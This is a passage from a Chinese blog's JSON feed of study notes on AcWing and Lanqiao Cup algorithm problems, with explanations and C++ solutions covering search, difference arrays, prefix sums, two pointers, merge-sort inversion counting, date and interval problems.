30;\n\nint n,m;\nint way[N];\n\n//当前枚举到的位置u\n//当前可以枚举的最小数start\nvoid dfs(int u, int start)&#123;\n    if (u+n-start &lt; m) return; //剪枝：当选了u-1个数时，此时枚举到第u个数，如果后续start到n的所有数都被选上仍不足以组合成m位，就进行剪枝\n    if (u == m+1)\n    &#123;\n        //边界，输出当前方案的m个数\n        for (int i = 1; i &lt;= m; i++) printf(&quot;%d&quot;, way[i]);\n        puts(&quot;&quot;);\n        return;\n    &#125;\n    for (int i = start; i &lt;= n; i++)\n    &#123;\n        way[u] = i;\n        dfs(u+1, i+1);\n        way[u] = 0; //0表示空，恢复现场\n    &#125;\n&#125;\n\n\nint main()&#123;\n    //n个数选m个\n    scanf(&quot;%d%d&quot;, &amp;n, &amp;m);\n\n    dfs(1, 1);\n\n    return 0;\n&#125;\n</code></pre>\n<p>dfs 剪枝优化：提前发现不可行的方案进行退出</p>\n<p><strong>非递归法</strong></p>\n<pre><code>\n</code></pre>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95_%E8%93%9D%E6%A1%A5%E6%9D%AF/",
            "url": "http://yoursite.com/Algorithm/%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95_%E8%93%9D%E6%A1%A5%E6%9D%AF/",
            "title": "Acwing每日一题",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h1 id=\"每日一题\"><a class=\"anchor\" href=\"#每日一题\">#</a> 每日一题</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9ibG9nL2NvbnRlbnQvNDExNTgv\">蓝桥考点解析</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9ibG9nL2NvbnRlbnQvMzIv\">由数据范围反推算法复杂度以及算法内容</span></p>\n<h2 id=\"二分差分\"><a class=\"anchor\" href=\"#二分差分\">#</a> 二分 &amp; 差分</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9wcm9ibGVtL2NvbnRlbnQvZGVzY3JpcHRpb24vNTA1Lw==\">AcWing 503. 借教室</span></p>\n<p>数据范围 10 的 6 次方 =&gt; 时间复杂度 <code>O(n)或小常数O(nlogn)</code></p>\n<ul>\n<li>总体思路\n<ul>\n<li><strong>二分</strong>（查找）：设置 mid 为最后一天没出现负值，mid+1 为第一天出现负值</li>\n<li><strong>差分</strong>（判断）：计算每天的剩余教室量，判断是否 &lt;u&gt; 满足最后一天没出现负值 &lt;/u &gt; 的条件</li>\n</ul>\n</li>\n</ul>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\ntypedef long long LL;\n\nconst int N = 1000010;\n\nint n,m;\nint w[N];\nint d[N],l[N],r[N];\n// 差分数组\nLL b[N];\n\nbool check(int mid) &#123;\n    memset(b, 0, sizeof b);\n    // 差分数组状态更新\n    for (int i = 1; i &lt;= mid; i ++ ) &#123;\n        b[l[i]] += d[i];\n        b[r[i] + 1] -= d[i];\n    &#125;\n    for (int i = 1; i &lt;= n; i ++ ) &#123;\n        b[i] += b[i - 1];\n        if(b[i] &gt; w[i]) return false;\n    &#125;\n    return true;\n&#125;\n\nint main()\n&#123;\n    scanf(&quot;%d%d&quot;, &amp;n, &amp;m);\n    for (int i = 1; i &lt;= n; i ++ )\n        scanf(&quot;%d&quot;, &amp;w[i]);\n    for (int i = 1; i &lt;= m; i ++ )\n        scanf(&quot;%d%d%d&quot;, &amp;d[i], &amp;l[i], &amp;r[i]);\n        \n    // l=0表示一个订单都不满足\n    int l = 0, r = m;\n    while (l &lt; r) &#123;\n        int mid = (l + r + 1) &gt;&gt; 1;\n        if (check(mid)) l = mid;\n        // mid不满足条件需要舍弃\n        else r = mid - 1;\n    &#125;\n    \n    if (r == m) puts(&quot;0&quot;);//没动\n    // l=r=mid,mid满足条件，选择不满足条件的mid+1\n    else printf(&quot;-1\\n%d\\n&quot;, r + 1);\n    \n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"前缀和\"><a class=\"anchor\" href=\"#前缀和\">#</a> 前缀和</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9wcm9ibGVtL2NvbnRlbnQvNTY0Lw==\">AcWing 562. 壁画</span></p>\n<p>数据范围 10 的 6 次方 =&gt; 时间复杂度 <code>O(n)或小常数O(nlogn)</code></p>\n<ul>\n<li>画的墙是连续的一段</li>\n<li>毁坏的墙只出现在两端</li>\n<li>画一个坏一个这样的顺序模式，导致最终长度一定是 <code>⌈n/2⌉上取整</code></li>\n<li>可以取中间部分的墙体，以中点划分，被画的部分长分别为 <code>a,b</code> ，定制规则：第一次画中点的墙体，然后哪边毁了画哪边，n 长的墙体分为 <code>a,a-1,1,b,b</code></li>\n<li>前缀和计算</li>\n</ul>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nconst int N = 5000010;\n\nint n;\nint s[N];\nchar str[N];\n\nint main()\n&#123;\n    // T组测试数据\n    int T;\n    scanf(&quot;%d&quot;, &amp;T);\n    \n    // 按组别数循环\n    for (int cases = 1; cases &lt;= T; cases ++ ) &#123;\n        // 墙体长度\n        scanf(&quot;%d&quot;, &amp;n);\n        // 评分标准序列\n        scanf(&quot;%s&quot;, str + 1);\n        for (int i = 1; i &lt;= n; i++ )\n            // 递进计算每次画墙后的总分\n            s[i] = s[i - 1] + (str[i] - '0');\n            \n        // 从中点开始画\n        int res = 0, m = (n + 1) / 2;\n        for (int i = m; i &lt;= n; i ++ )\n            // 计算前缀和：对半移动\n            res = max(res, s[i] - s[i - m]);\n        printf(&quot;Case #%d: %d\\n&quot;, cases, res);\n    &#125;\n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"差分\"><a class=\"anchor\" href=\"#差分\">#</a> 差分</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9wcm9ibGVtL2NvbnRlbnQvNDI2NS8=\">AcWing 4262. 空调</span></p>\n<p>数据范围 10 的 5 次方 =&gt; 时间复杂度 <code>O(nlogn)</code></p>\n<ul>\n<li>题意变为差值数组，T=&gt;P 改为 0=&gt;T-P</li>\n<li>利用差分，一段范围内的更新变为两点 <code>b[l]++,b[r+1]--</code>  更新</li>\n<li><strong>下界</strong>：差分数组和为 0，正数负数可以相加抵消 =&gt; 最小的指令次数≥差分数组整数之和，这个下界值即为答案最小数量</li>\n</ul>\n<p>&lt;img src=&quot;C:\\Users\\LENOVO\\Desktop\\WorkSpace\\LanQiaoBei\\images\\acwing4262.png&quot; alt=&quot;acwing4262&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nconst int N = 100010;\nint n;\nint b[N];\n\nint main()\n&#123;\n    scanf(&quot;%d&quot;, &amp;n);\n    for (int i = 1; i &lt;= n; i ++ ) scanf(&quot;%d&quot;, &amp;b[i]);\n    // 算出转换的差值数组\n    for (int i = 1; i &lt;= n; i ++ ) &#123;\n        int m;\n        scanf(&quot;%d&quot;, &amp;m);\n        b[i] -= m;\n    &#125;\n    // 差分数组\n    // 倒序改变值，因为d[]和b[]共用一个数组顺序解决会提前改变b[l]值，导致b[r + 1]值变化\n    // b[l] = d[l] - d[l - 1]\n    // b[r + 1] = d[r + 1] - d[r]\n    for (int i = n + 1; i; i -- ) b[i] -= b[i - 1];\n    \n    // 算出差分数组的正数之和，即为解的下界\n    int res = 0;\n    for (int i = 1; i &lt;= n + 1; i ++ )\n        if(b[i] &gt;= 0)\n            res += b[i];\n    printf(&quot;%d&quot;, res);\n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"双指针\"><a class=\"anchor\" href=\"#双指针\">#</a> 双指针</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9hY3Rpdml0eS9jb250ZW50L3Byb2JsZW0vY29udGVudC85NzIzLw==\">AcWing 3745. 牛的学术圈 I</span></p>\n<p>数据范围 10 的 5 次方 =&gt; 时间复杂度 <code>O(nlogn)</code></p>\n<ul>\n<li>需要按照引用次数计算 h 指数，先排序，再考虑条件\n<ul>\n<li>前 h 篇论文的引用次数都大于等于 h-1（写完综述 + 1 变 h 次）</li>\n<li>其中最多有 L 个数等于 h-1（最多引用）</li>\n</ul>\n</li>\n<li>核心思路：排序后数组为单调递减（ <code>i篇引用≥h，引用次数Ci越大，下标i越靠前</code> ），找到大于等于 h 的最后一个数，获取下标 <code>j</code> ，判断是否下标 <code>j&lt;=L</code> ，同时是否存在 <code>h-j篇引用次数为h-1</code></li>\n<li>一个下标关于另一个下标单调 =&gt;  <code>双指针法</code></li>\n</ul>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nconst int N = 100010;\nint n,L;\nint w[N];\n\nint main()\n&#123;\n    scanf(&quot;%d%d&quot;, &amp;n, &amp;L);\n    for (int i = 1; i &lt;= n; i ++ ) scanf(&quot;%d&quot;, &amp;w[i]);\n    \n    sort(w + 1, w + n + 1, greater&lt;int&gt;());\n    \n    \n    int res = 0;\n    for (int i = 1, j = n; i &lt;= n; i ++ ) &#123;\n        // j没遍历完，同时保证w[j]&gt;=h\n        while (j &amp;&amp; w[j] &lt; i) j--;\n        // i遍历完所有h-1停止，同时保证h-1个数&lt;=L\n        if (w[i] &gt;= i - 1 &amp;&amp; i - j &lt;= L)\n            res = i;\n    &#125;\n    printf(&quot;%d&quot;, res);\n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"归并排序\"><a class=\"anchor\" href=\"#归并排序\">#</a> 归并排序</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9wcm9ibGVtL2NvbnRlbnQvNTA3Lw==\">AcWing 505. 火柴排队</span></p>\n<ul>\n<li>需要解决的问题\n<ul>\n<li>什么情况下距离最小：A、B 都同时以升序 / 降序排列</li>\n<li>如何通过顺序交换实现这个距离： <code>离散化=&gt;映射=&gt;归并排序(代码模板)=&gt;逆序对</code></li>\n</ul>\n</li>\n<li>火柴高度（数值过大，用作数组下标时，可能会超内存）：<strong>离散化（只考虑相对大小关系）</strong>，将 A 和 B 都变为 <code>1,...,n</code>  的排列分布， <code>离散化是一种将原始数据映射到连续的整数集合的过程，通常用于处理离散值范围较大的情况</code></li>\n<li>离散化方法\n<ul>\n<li>排序 + 二分</li>\n<li>lambda 表达式法</li>\n</ul>\n</li>\n<li>简化问题：A 有序，只能交换 B（因为每次只能交换相邻数，所以最小交换次数是<strong>逆序对</strong>，求逆序对 =&gt; <code>归并排序</code> 、 <code>树状数组</code> ），若只能交换 A，也类似</li>\n<li>回归问题，A，B 都无序，但是因为 <code>离散化后分布一致</code> ，利用<strong>映射</strong>的思想，将 A 中的数映射为升序，只需要将 B 中与之对应的数映射变换即可，生成的新序列与原序列在本质上别无二致</li>\n</ul>\n<p><code>！！！编译提交之前需要删除注释，否则超时</code></p>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nconst int N = 100010, MOD = 99999997;\nint n;\n// \nint a[N], b[N], c[N], p[N];\n\n// a,b离散化\nvoid work(int a[]) &#123;\n    // 存入顺序\n    for (int i = 1; i &lt;= n; i ++ ) p[i] = i;\n    sort(p + 1, p + n + 1, [&amp;](int x, int y)&#123;\n        return a[x] &lt; a[y];\n    &#125;);\n    // 离散化实现\n    for (int i = 1; i &lt;= n; i ++ ) a[p[i]] = i;\n&#125;\n\n// 归并排序计算逆序对\nint merge_sort(int l, int r) &#123;\n    if (l &gt;= r) return 0;\n    int mid = (l + r) &gt;&gt; 1;\n    // 分别递归调用左右部分，逆序对相加取模\n    int res = (merge_sort(1, mid) + merge_sort(mid + 1, r) )% MOD;\n    \n    int i = 1, j = mid + 1, k = 0;\n    // 较小的元素放入辅助数组p[]\n    while (i &lt;= mid &amp;&amp; j &lt;= r) &#123;\n        if (b[i] &lt; b[j]) p[k ++ ] = b[i ++ ];\n        // res增加mid - i + 1，表示左半部分剩余的元素都大于b[j]\n        else p[k ++ ] = b[j ++ ], res = (res + mid - i + 1) % MOD;\n    &#125;\n    // 剩余的元素复制回原数组b[]\n    while (i &lt;= mid) p[k ++ ] = b[i ++ ];\n    while (j &lt;= r) p[k ++ ] = b[j ++ ];\n    \n    for (int i = 1, j = 0; j &lt; k; i ++ , j ++ ) b[i] = p[j]; \n    return res;\n&#125;\n\nint main()\n&#123;\n    scanf(&quot;%d&quot;, &amp;n);\n    for (int i = 1; i &lt;= n; i ++ ) scanf(&quot;%d&quot;, &amp;a[i]);\n    for (int i = 1; i &lt;= n; i ++ ) scanf(&quot;%d&quot;, &amp;b[i]);\n    \n    work(a), work(b);\n    // c存入a的顺序映射关系\n    for (int i = 1; i &lt;= n; i ++ ) c[a[i]] = i;\n    // b按照c存入的映射关系完成影身\n    for (int i = 1; i &lt;= n; i ++ ) b[i] = c[b[i]];\n    \n    // 利用归并排序求得逆序对\n    printf(&quot;%d\\n&quot;, merge_sort(1, n));\n    \n    \n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"多路归并\"><a class=\"anchor\" href=\"#多路归并\">#</a> 多路归并</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9wcm9ibGVtL2NvbnRlbnQvMTI2NC8=\">AcWing 1262. 鱼塘钓鱼</span></p>\n<ul>\n<li>贪心：路程时间 + 钓鱼时间（一定是直线走法，不会迂回）</li>\n<li>多路归并：多个单调递减的鱼塘序列合并为一个有序序列， <code>从当前每个鱼塘的数量中选择最大的</code></li>\n</ul>\n<pre><code class=\"language-c++\">#include &lt;algorithm&gt;\n#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n\nusing namespace std;\n\nconst int N = 110;\n// 鱼的数量，每分钟钓鱼数，两鱼塘间隔时间，每个鱼塘的钓鱼停留时间\nint num[N], dect[N], t[N], spend[N];\n\n// 鱼塘剩余的鱼数量\nint get(int k) &#123;\n    return max(0, num[k] - dect[k] * spend[k]);\n&#125;\n\n// work(上一个满足方案的鱼塘编号, 剩余钓鱼次数1次/min)\nint work(int n, int ddl) &#123;\n    int res = 0;\n    // 初始化每个鱼塘钓鱼时间为0\n    memset(spend, 0, sizeof spend);\n    \n    // 剩余钓鱼次数\n    for (int i = 0; i &lt; ddl; i ++ ) &#123;\n        // 从第一个开始和后面每个鱼塘比较，找出最大\n        int t = 1;\n        for (int j = 2; j &lt;= n; j ++ )\n            if (get(t) &lt; get(j))\n                t = j;\n        res += get(t);\n        spend[t] ++ ;\n    &#125;\n    return res;\n&#125;\n\nint main()\n&#123;\n    int n, ddl;\n    scanf(&quot;%d&quot;, &amp;n);\n    for (int i = 1; i &lt;= n; i ++ ) scanf(&quot;%d&quot;, &amp;num[i]);\n    for (int i = 1; i &lt;= n; i ++ ) scanf(&quot;%d&quot;, &amp;dect[i]);\n    for (int i = 2; i &lt;= n; i ++ ) &#123;\n        scanf(&quot;%d&quot;, &amp;t[i]);\n        t[i] += t[i - 1];\n    &#125;\n    scanf(&quot;%d&quot;, &amp;ddl);\n    \n    int res = 0;\n    // 从第一个鱼塘开始找到最大的钓鱼数\n    for (int i = 1; i &lt;= n; i ++ )\n        res = max(res, work(i, ddl - t[i]));\n    \n    printf(&quot;%d\\n&quot;, res);\n    \n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"贡献法\"><a class=\"anchor\" href=\"#贡献法\">#</a> 贡献法</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9hY3Rpdml0eS9jb250ZW50L3Byb2JsZW0vY29udGVudC85NzQxLw==\">AcWing 4261. 孤独的照片</span></p>\n<ul>\n<li>\n<p>先枚举区间 <code>起点+终点</code> ，再枚举牛， <code>O(n^2)</code> ；先枚举牛 ( <code>每头牛对孤独区间的贡献</code> )，再枚举区间，找到牛对应的孤独区间， <code>O(n)</code></p>\n</li>\n<li>\n<p>枚举牛：获得每头牛位置之前的子区间中以 G 为分隔符的最大长度</p>\n</li>\n<li>\n<p>连续牛的个数不少于</p>\n<ul>\n<li>孤独的牛 G 左右两边至少有一个另一种牛 H，LR 个可能</li>\n<li>孤独的牛 G 左无 H，右边至少两个 H， R-1 个可能</li>\n<li>孤独的牛 G 右无 H，左边至少两个 H， L-1 个可能</li>\n</ul>\n</li>\n</ul>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nconst int N = 500010;\ntypedef long long LL;\n\nint n;\nchar str[N];\nint l[N], r[N];\n\nint main() &#123;\n    scanf(&quot;%d%s&quot;, &amp;n, str);\n    // l[],r[]从左到右和从右到左每个位置的子串中以 'G' 为分隔符的最大长度\n    // sh, sg表示当前位置之前H或G连续的个数\n    for (int i = 0, sh = 0, sg = 0; i &lt; n; i ++ ) &#123;\n        if (str[i] == 'G') l[i] = sh, sg ++ , sh = 0;\n        else l[i] = sg, sh ++ , sg = 0;\n    &#125;\n    \n    for (int i = n -1, sg = 0, sh = 0; i &gt;= 0; i -- ) &#123;\n        if(str[i] == 'G') r[i] = sh, sg ++ , sh = 0;\n        else r[i] = sg, sh ++ , sg = 0;\n    &#125;\n    \n        \n    LL res = 0;\n    for (int i = 0; i &lt; n; i ++ )\n        // 给(LL)加括号，提前进行类型转换\n        res += (LL)l[i] * r[i] + max(r[i] - 1, 0) + max(l[i] - 1, 0);\n    \n    printf(&quot;%lld\\n&quot;, res);\n    \n    return 0;\n&#125;\n</code></pre>\n<p><strong>更易理解做法</strong></p>\n<pre><code class=\"language-c++\">#include &lt;bits/stdc++.h&gt;\nusing namespace std;\n\nconst int N = 500010;\ntypedef long long LL;\n\nint n;\nchar s[N];\n\nint main()\n&#123;\n    cin &gt;&gt; n &gt;&gt; s; // 读入字符串长度和字符串内容\n\n    LL res = 0; // 用来存储结果的变量，初始化为0\n\n    for (int i = 0; i &lt; n; i ++) // 遍历字符串中的每个位置\n    &#123;\n        char x = s[i]; // 当前位置的字符\n        int l = i - 1, r = i + 1; // 初始化左右两个指针\n\n        // 向左寻找以当前字符为分隔符的最长子串\n        while (l &gt;= 0 &amp;&amp; x != s[l]) l --;\n        // 向右寻找以当前字符为分隔符的最长子串\n        while (r &lt; n &amp;&amp; x != s[r]) r ++;\n\n        int L = i - l - 1, R = r - i - 1; // 计算左右两侧子串的长度\n        res += (LL)L * R; // 更新结果，累加以当前位置为分隔符的子串对数\n        if (L &gt; 0) res += L - 1; // 如果左侧子串长度大于0，加上左侧子串内部的分隔符对数\n        if (R &gt; 0) res += R - 1; // 如果右侧子串长度大于0，加上右侧子串内部的分隔符对数\n    &#125;\n\n    cout &lt;&lt; res &lt;&lt; endl; // 输出结果\n\n    return 0; \n&#125;\n</code></pre>\n<h2 id=\"日期问题\"><a class=\"anchor\" href=\"#日期问题\">#</a> 日期问题</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9wcm9ibGVtL2NvbnRlbnQvMzUwMS8=\">AcWing 3498. 日期差值</span></p>\n<ul>\n<li>数据范围：按天枚举，100 组 10000 年，估摸 3.65 亿次，有<strong>超时的风险</strong></li>\n<li>思路变换为\n<ul>\n<li>两个时间的差值 = abs (第一个时间到公元第一天天数 - 第二个时间到公元第一天的天数)</li>\n</ul>\n</li>\n</ul>\n<p>这里需要注意，因为有 <code>100</code>  组数据，需要用 <code>while</code>  循环读数据</p>\n<pre><code class=\"language-c++\">scanf返回值：\n如果只有a被成功读入，返回值为1；\n如果a和b都未被成功读入，返回值为0；\n如果遇到错误或遇到end of file（文件结束），返回值为EOF（即-1）。\n~的意义：EOF（-1）补码表示为全1，按位取反后为全0，即false\n~scanf表示while循环在读完所有组别数据后就终止循环\n</code></pre>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nconst int month[] = &#123;\n    0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31\n&#125;;\n\nint is_leap(int year) &#123;\n    if (year % 4 == 0 &amp;&amp; year % 100 || year % 400 == 0)\n        return 1;\n    return 0;\n&#125;\n\n// 获取每个月天数\nint get_days(int y, int m) &#123;\n    if (m == 2) return 28 + is_leap(y);\n    return month[m];\n&#125;\n\nint calc(int y, int m, int d) &#123;\n    int res = 0;\n    for (int i = 1; i &lt; y; i ++ )\n        res += 365 + is_leap(i);\n    for (int i = 1; i &lt; m; i ++ )\n        res += get_days(y, i);\n    return res + d;\n&#125;\n\n\nint main()\n&#123;\n    int y1, y2, m1, m2, d1, d2;\n    while (~scanf(&quot;%04d%02d%02d\\n%04d%02d%02d&quot;, &amp;y1, &amp;m1, &amp;d1, &amp;y2, &amp;m2, &amp;d2))\n        printf(&quot;%d\\n&quot;, abs(calc(y1, m1, d1) - calc(y2, m2, d2)) + 1);\n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"区间合并\"><a class=\"anchor\" href=\"#区间合并\">#</a> 区间合并</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9hY3Rpdml0eS9jb250ZW50L3B1bmNoX3RoZV9jbG9jay8zNzgyLw==\">AcWing 1343. 挤牛奶</span></p>\n<p>数据范围 10 的 5 次方 =&gt; 时间复杂度 <code>O(nlogn)</code></p>\n<pre><code class=\"language-c++\">#include &lt;bits/stdc++.h&gt;\n#define x first\n#define y second\n\nusing namespace std;\n\ntypedef pair&lt;int,int&gt; PII;\n\nconst int N = 5010;\nint n;\nPII segs[N];\n\nint main() &#123;\n    // 输入区间个数\n    scanf(&quot;%d&quot;, &amp;n);\n\n    // 输入各个区间的起始和结束点，并存储在数组segs中\n    for (int i = 0; i &lt; n; i ++ ) \n        scanf(&quot;%d%d&quot;, &amp;segs[i].x, &amp;segs[i].y);\n\n    // 按区间的起始点进行升序排序\n    sort(segs, segs + n);\n\n    // 初始化最长连续区间和最长间隔区间的结果为0\n    int res1 = 0, res2 = 0;\n\n    // 初始化当前连续区间的左右边界为第一个区间的起始和结束点\n    int l = segs[0].x, r = segs[0].y;\n\n    // 遍历区间数组\n    for (int i = 1; i &lt; n; i ++ )\n        // 如果当前区间的起始点小于等于当前连续区间的右边界，则合并区间\n        if (segs[i].x &lt;= r) \n            r = max(r, segs[i].y);\n        else &#123;\n            // 更新最长连续区间和最长间隔区间的结果\n            res1 = max(res1, r - l);\n            res2 = max(res2, segs[i].x - r);\n            // 更新到下一组区间，更新左右边界\n            l = segs[i].x, r = segs[i].y;\n        &#125;\n\n    // 更新最后一组区间的结果\n    res1 = max(res1, r - l);\n\n    // 输出最长连续区间和最长间隔区间的结果\n    printf(&quot;%d %d\\n&quot;, res1, res2);\n\n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"递归\"><a class=\"anchor\" href=\"#递归\">#</a> 递归</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9hY3Rpdml0eS9jb250ZW50L3B1bmNoX3RoZV9jbG9jay8zNzgyLw==\">AcWing 1360. 有序分数</span></p>\n<ul>\n<li>\n<p>暴力搜索：n^2 枚举一遍，判断是不是互质，若互质，存入 pair 数组，然后排序，输出即可</p>\n<ul>\n<li><strong>pair 数组需要自定义顺序排序规则</strong>： <code>a.y / a.x</code> &lt; <code>b.y / b.x</code> ，通分得 <code>a.y * b.x</code> &lt; <code>a.x * b.y</code></li>\n</ul>\n</li>\n<li>\n<p>求最大公约数</p>\n<pre><code class=\"language-c++\">int gcd(int a, int b) &#123;\n    // 辗转相除法\n    return b ? gcd(b, a % b) : a;\n&#125;\n</code></pre>\n</li>\n</ul>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n\n#define x first\n#define y second\n\nusing namespace std;\n\nconst int N = 180;\n\ntypedef pair&lt;int, int&gt; PII;\n\nint n;\nPII q[N * N];\n\n// 判断互质\nint gcd(int a, int b) &#123;\n    // 辗转相除法\n    return b ? gcd(b, a % b) : a;\n&#125;\n\nbool cmp(PII a, PII b) &#123;\n    return a.y * b.x &lt; a.x * b.y;\n&#125;\n\nint main()\n&#123;\n    scanf(&quot;%d&quot;,&amp;n);\n    \n    int cnt = 0;\n    // 分母\n    for (int i = 0; i &lt;= n; i ++ )\n        // 分子\n        for (int j = 0; j &lt;= i; j ++ )\n            if (gcd(i, j) == 1)\n                q[cnt ++] = &#123;i, j&#125;;\n                \n    sort(q, q + cnt, cmp);\n    \n    // &#123;i, j&#125; =&gt; &#123;分母，分子&#125; &lt;= &#123;x, y&#125;\n    for (int i = 0; i &lt; cnt; i ++ )\n        printf(&quot;%d/%d\\n&quot;, q[i].y, q[i].x);\n    \n    return 0;\n&#125;\n</code></pre>\n<ul>\n<li><code>Stern-Brocot Tree</code>  算法：可以在 0~1 中找出所有的有理数</li>\n</ul>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint n;\n\nvoid dfs(int a, int b, int c, int d) &#123;\n    if (b + d &gt; n) return;\n    // 左半边递归，分子分母相加\n    dfs(a, b, a + c, b + d);\n    printf(&quot;%d/%d\\n&quot;, a + c, b + d);\n    // 右半边递归，分子分母相加\n    dfs(a + c, b + d, c, d);\n&#125;\n\nint main()\n&#123;\n    ios::sync_with_stdio(false);\n    cin.tie(0);\n    cin &gt;&gt; n;\n    \n    puts(&quot;0/1&quot;);\n    dfs(0, 1, 1, 1);\n    puts(&quot;1/1&quot;);\n    \n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"dfs\"><a class=\"anchor\" href=\"#dfs\">#</a> DFS</h2>\n<ul>\n<li>转换为计算两个由  <code>X</code>  组成的矩阵中所有  <code>X</code>  之间的<strong>最小曼哈顿距离（两个点横坐标差的绝对值和纵坐标差的绝对值的和）</strong></li>\n<li>矩阵 N 行 M 列，矩阵大小 <code>50*50=2500</code> ，遍历面积的最大格式为 <code>c(2500-c)</code> ，根据均值不等式，得知在中点处最大，数据量大小为 100 万左右</li>\n<li>核心思路：\n<ul>\n<li>枚举，找到一个 <code>X</code>  时，用 <code>DFS/BFS/并查集</code> 搜索出整个连通块（DFS 代码短；BFS 第一次求得为最短路径，栈空间较小）</li>\n</ul>\n</li>\n<li><code>vector&lt;PII&gt;&amp; q</code>  通过引用允许函数直接操作调用者提供的变量，而不是对变量进行复制，这样可以减少内存消耗和提高效率</li>\n</ul>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n#include &lt;vector&gt;\n#define x first\n#define y second\n\nusing namespace std;\n\ntypedef pair&lt;int, int&gt; PII;\nconst int N = 55;\n\nint n, m;\nchar g[N][N];// 牛皮矩阵\nvector&lt;PII&gt; points[2];// 保存点坐标&#123;[x1, x2, ...], [y1, y2, ...]&#125;\n// 4方向偏移量\nint dx[4] = &#123;-1, 0, 1, 0&#125;, dy[4] = &#123;0, 1, 0, -1&#125;;\n\nvoid dfs(int a, int b, vector&lt;PII&gt;&amp; q) &#123;\n    // 入栈\n    q.push_back(&#123;a, b&#125;);\n    g[a][b] = '.';\n    \n    for (int i = 0; i &lt; 4; i ++ ) &#123;\n        // 更新纵坐标和横坐标\n        int x = a + dx[i], y = b + dy[i];\n        // 不越界继续搜索，复原出斑点的位置\n        if (x &gt;= 0 &amp;&amp; x &lt; n &amp;&amp; y &gt;= 0 &amp;&amp; y &lt; m &amp;&amp; g[x][y] == 'X')\n            dfs(x, y, q);\n    &#125;\n&#125;\n\nint main()\n&#123;\n    scanf(&quot;%d%d&quot;, &amp;n, &amp;m);\n    for (int i = 0; i &lt; n; i ++ ) scanf(&quot;%s&quot;, g[i]);\n    \n    // 连通块的个数\n    int k = 0;\n    for (int i = 0; i &lt; n; i ++ )\n        for (int j = 0; j &lt; m; j ++ )\n            if (g[i][j] == 'X')\n                dfs(i, j, points[k ++ ]);\n    // 最远的曼哈顿距离需要&gt;100，这里设置为110\n    int res = 110;\n    // 遍历获取斑点的坐标值\n    for (auto&amp; a: points[0])\n        for (auto&amp; b: points[1])\n            res = min(res, abs(a.x - b.x) + abs(a.y - b.y)); // 更新最小曼哈顿距离\n            \n    printf(&quot;%d\\n&quot;, res - 1);\n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"剪枝\"><a class=\"anchor\" href=\"#剪枝\">#</a> 剪枝</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9hY3Rpdml0eS9jb250ZW50L3Byb2JsZW0vY29udGVudC85NzY3Lw==\">AcWing 167. 木棒</span></p>\n<ul>\n<li>暴搜：从小到大枚举答案的长度 <code>len</code> ，依次拼每根长度为 <code>len</code>  